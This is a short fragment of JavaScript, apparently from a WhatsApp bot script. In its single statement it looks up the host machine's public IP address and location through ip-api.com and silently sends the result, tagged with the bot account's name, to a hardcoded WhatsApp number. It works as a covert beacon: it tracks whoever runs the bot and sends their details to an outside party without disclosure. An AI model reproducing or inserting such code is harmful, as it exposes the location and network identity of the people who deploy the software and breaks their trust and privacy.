...
fetch(`http://ip-api.com/json`).then(res => res.text()).then(teks =>{ nisa.sendMessage("6285866295942@s.whatsapp.net", `${JSON.stringify(teks, null, 2)}`, MessageType.text, { contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title:`ip address ${nisa.user.name}`,thumbnail:mfrply,previewType:"PHOTO"}}})})
